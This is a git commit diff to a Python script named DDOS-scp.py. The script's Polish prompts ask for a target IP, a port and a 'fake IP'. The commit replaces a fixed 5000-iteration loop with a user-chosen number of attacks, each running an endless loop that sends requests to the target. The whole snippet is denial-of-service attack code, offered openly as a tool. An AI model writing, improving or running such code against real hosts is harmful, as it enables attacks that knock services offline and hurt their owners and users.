0d867f8d650a82ad9ce300309fe18537a03633bb
*Frezo* <wilczewski.dominik@gmail.com>
2020-11-30 23:37:35 +0100

    Update DDOS-scp.py

--- DDOS-scp.py
+++ DDOS-scp.py
@@ -9,6 +9,7 @@ print(Fore.MAGENTA + f.renderText('DDOS SCRIPT'))
 target = input('Podaj ip: ')
 port = int(input('Podaj port: '))
 fake_ip = input('Podaj sztuczne ip: ')
+threads = int(input('Podaj ilość ataków: '))
 
 def ddos():
     while True:
@@ -19,7 +20,7 @@ def ddos():
         s.sendto(('HOST /' + fake_ip + ' \r\n\r\n').encode('ascii'), (target, port))   ### wysylanie zapytan
         s.close()
 
-for i in range(5000):
+for i in range(threads):
     ddos()
     thread = threading.Thread(target=ddos)
     thread.start()
